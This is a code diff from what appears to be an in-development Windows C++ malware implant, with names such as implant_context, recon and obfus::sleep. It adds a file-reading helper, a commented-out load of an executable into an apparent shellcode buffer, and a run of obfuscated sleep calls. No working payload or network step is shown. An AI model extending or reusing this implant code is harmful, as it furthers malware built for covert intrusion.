@@ -1,11 +1,64 @@
 #include "main.hpp"
 #pragma comment(lib,"winhttp.lib")
 
+bool read_from_disk(const std::string& file_name, std::string& outbuff) {
+
+    HANDLE hFile = CreateFileA(
+        file_name.c_str(),
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ,
+        nullptr,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        nullptr
+    );
+
+    if(hFile == INVALID_HANDLE_VALUE) {
+        return false;
+    }
+
+    DWORD file_size = GetFileSize(hFile, nullptr);
+    if(file_size == INVALID_FILE_SIZE) {
+        return false;
+    }
+
+    outbuff.resize(file_size);
+    DWORD bytesread = 0;
+    if(!ReadFile(
+        hFile,
+        outbuff.data(),
+        file_size,
+        &bytesread,
+        nullptr
+    ) || bytesread != file_size) {
+        return false;
+    }
+
+    CloseHandle(hFile);
+    return true;
+}
+
 bool recieve_commands(const implant_context& ctx) {
 
-    std::string cur_proc_name;
-    recon::get_current_process_name(cur_proc_name);
+    /*
+    std::string shc_buff;
+    if(!read_from_disk("C:\\Users\\diago\\Downloads\\random.exe", shc_buff)) {
+        std::cerr << "nah.." << std::endl;
+        return false;
+    }
+    */
 
+    std::cout << "sleeping for 3 seconds!" << std::endl;
+    obfus::sleep(3000);
+
+    std::cout << "now for 2!" << std::endl;
+    obfus::sleep(2000);
+
+    std::cout << "and now for 10!!" << std::endl;
+    obfus::sleep(10000);
+
+    std::cout << "alright and now for 1 lol." << std::endl;
+    obfus::sleep(1000);
 
     /*
     HINTERNET hSession = nullptr;
